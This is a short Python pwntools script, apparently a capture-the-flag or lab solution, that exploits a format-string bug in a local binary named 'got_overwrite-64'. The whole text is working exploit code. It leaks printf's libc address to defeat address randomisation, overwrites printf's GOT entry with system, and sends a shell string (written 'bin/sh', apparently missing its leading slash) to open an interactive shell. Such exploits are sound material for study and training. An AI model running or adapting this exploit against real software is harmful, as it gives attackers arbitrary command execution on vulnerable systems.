import pwn 
from pwn import * 

elf = context.binary = ELF("./got_overwrite-64")
libc = elf.libc
p = process()

payload = b"%7$s"
payload += b"AAAA"
payload += p64(elf.got["printf"])

p.sendline(payload)

leak = u64(p.recv(6) + b"\x00\x00")
#print(leak)
libc.address = leak - libc.sym["printf"]

payload = fmtstr_payload(6,{elf.got["printf"] : libc.sym["system"]})
p.sendline(payload)

p.sendline(b"bin/sh")

p.clean()
p.interactive()
